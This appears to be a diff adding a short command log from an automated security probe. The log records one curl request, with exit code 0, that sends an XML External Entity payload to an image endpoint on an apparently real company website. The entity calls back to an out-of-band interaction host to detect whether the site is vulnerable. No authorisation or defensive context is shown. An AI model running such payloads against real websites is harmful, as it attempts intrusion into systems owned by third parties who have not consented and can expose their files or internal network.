@@ -1,0 +1,4 @@
+# command: timeout 20 curl -s -m 18 -o /dev/null -X POST -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://oobee92b76a3bdb.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in/xxe">]><r>&xxe;</r>' 'https://www.infinitycapital.bh/_next/image?url=https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2F1GCT0vyjqmOwm2OL1YVpD1%2F2ab55f8b5189afa153eac5cb97f7f6d4%2FAhmed_Taleb_updated-min.jpg&w=1080'
+# exit_code: 0
+# ---
+
